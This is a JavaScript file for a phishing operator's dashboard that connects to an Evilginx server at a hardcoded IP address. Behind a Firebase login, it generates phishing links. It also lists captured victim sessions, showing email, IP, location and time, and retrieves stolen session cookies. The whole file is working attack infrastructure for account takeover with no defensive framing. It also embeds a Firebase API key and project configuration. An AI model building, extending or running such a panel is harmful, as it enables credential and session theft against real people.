console.log("Script.js loaded correctly");

// ✅ Correct Firebase Configuration (Replace with Your Real Firebase Config)
const firebaseConfig = {
    apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
    authDomain: "panel-auth-134b7.firebaseapp.com",
    projectId: "panel-auth-134b7",
    storageBucket: "panel-auth-134b7.firebasestorage.app",
    messagingSenderId: "892746068340",
    appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
};

// ✅ Initialize Firebase
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();

// ✅ Set Evilginx Server
const EVILGINX_SERVER = "http://3.149.242.245:5000";

// ✅ Ensure event listeners are correctly added
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("loginBtn")?.addEventListener("click", login);
    document.getElementById("logoutBtn")?.addEventListener("click", logout);
    document.getElementById("generateLinkBtn")?.addEventListener("click", generateLink);
    document.getElementById("fetchSessionsBtn")?.addEventListener("click", fetchCapturedSessions);
    document.getElementById("fetchCookiesBtn")?.addEventListener("click", fetchCookies);
});

// 🔹 LOGIN FUNCTION (Fixed)
function login() {
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    if (!email || !password) {
        alert("Please enter email and password.");
        return;
    }

    auth.signInWithEmailAndPassword(email, password)
        .then(() => {
            console.log("Login successful!");
            window.location.href = "dashboard.html"; // ✅ Redirect to dashboard
        })
        .catch(error => {
            alert("Login failed: " + error.message);
        });
}

// 🔹 LOGOUT FUNCTION (Fixed)
function logout() {
    auth.signOut().then(() => {
        window.location.href = "index.html";
    });
}

// 🔹 GENERATE LINK FUNCTION (Fixed)
function generateLink() {
    fetch(`${EVILGINX_SERVER}/generate_link`, {
        method: "POST",
        headers: { "Content-Type": "application/json" }
    })
    .then(response => response.json())
    .then(data => {
        if (data.link) {
            document.getElementById("generatedLink").textContent = `Generated Link: ${data.link}`;
        } else {
            alert("Failed to generate link.");
        }
    })
    .catch(error => console.error("Error generating link:", error));
}

// 🔹 FETCH CAPTURED SESSIONS (Fixed)
function fetchCapturedSessions() {
    fetch(`${EVILGINX_SERVER}/sessions`)
    .then(response => response.json())
    .then(data => {
        let sessionTable = document.getElementById("capturedSessionsTable");
        sessionTable.innerHTML = "<tr><th>Email</th><th>IP</th><th>Location</th><th>Time</th></tr>";
        
        data.sessions.forEach(session => {
            let row = sessionTable.insertRow();
            row.innerHTML = `<td>${session.email}</td><td>${session.ip}</td><td>${session.location}</td><td>${session.time}</td>`;
        });
    })
    .catch(error => console.error("Error fetching sessions:", error));
}

// 🔹 FETCH COOKIES FUNCTION (Fixed)
function fetchCookies() {
    fetch(`${EVILGINX_SERVER}/cookies`)
    .then(response => response.json())
    .then(data => {
        let cookiesTable = document.getElementById("cookiesTable");
        cookiesTable.innerHTML = "<tr><th>Session ID</th><th>Cookie Data</th></tr>";

        data.cookies.forEach(cookie => {
            let row = cookiesTable.insertRow();
            row.innerHTML = `<td>${cookie.session_id}</td><td>${cookie.cookie_data}</td>`;
        });
    })
    .catch(error => console.error("Error fetching cookies:", error));
}
